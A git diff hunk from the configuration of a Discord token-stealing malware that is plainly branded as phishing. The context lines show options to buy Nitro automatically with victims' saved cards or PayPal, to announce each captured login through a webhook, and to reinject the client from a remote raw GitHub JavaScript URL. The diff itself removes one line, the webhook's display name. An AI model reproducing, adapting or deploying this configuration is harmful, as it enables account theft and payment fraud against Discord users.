@@ -11,7 +11,6 @@ const config = {
   auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: '@SN-Fishing.cc 🐟', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 1746924, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/oxyidz/mezff/main/index.js', //injection url for when it reinjects
